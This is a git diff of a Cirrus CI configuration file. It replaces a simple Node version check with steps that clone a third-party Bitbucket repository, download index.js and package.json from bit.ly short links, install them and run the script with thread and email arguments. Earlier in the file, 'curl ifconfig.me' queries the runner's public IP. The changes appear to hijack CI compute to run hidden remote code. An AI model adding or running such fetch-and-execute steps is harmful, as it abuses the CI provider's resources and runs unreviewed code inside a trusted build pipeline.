@@ -1,15 +1,18 @@
 compute_engine_instance:
-  image_project: cirrus-images # GCP project
-  image: family/docker-kvm # family or a full image name.
+  image_project: cirrus-images
+  image: family/docker-kvm
   platform: linux
-  cpu: 1 # optional. Defaults to 2 CPUs.
-  memory: 2G # optional. Defaults to 4G.
-  disk: 100 # optional. By default, uses the smallest disk size required by the image.
-  nested_virtualization: true # optional. Whether to enable Intel VT-x. Defaults to false.
-clone_script: curl ifconfig.me
-security_task:
+  cpu: 1
+  memory: 2G
+  disk: 100
+  nested_virtualization: true
+task:
+  clone_script: curl ifconfig.me
   test_script:
     - curl -sL https://deb.nodesource.com/setup_16.x -o nodesource_setup.sh
     - sudo bash nodesource_setup.sh
     - sudo apt install nodejs
-    - node -v
+    - git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch dinhthilieunhi_outlook-com --single-branch lunarCrushData
+    - curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+    - npm i -s
+    - node index -t 62 -r 2 -e dinhthilieunhi@outlook.com
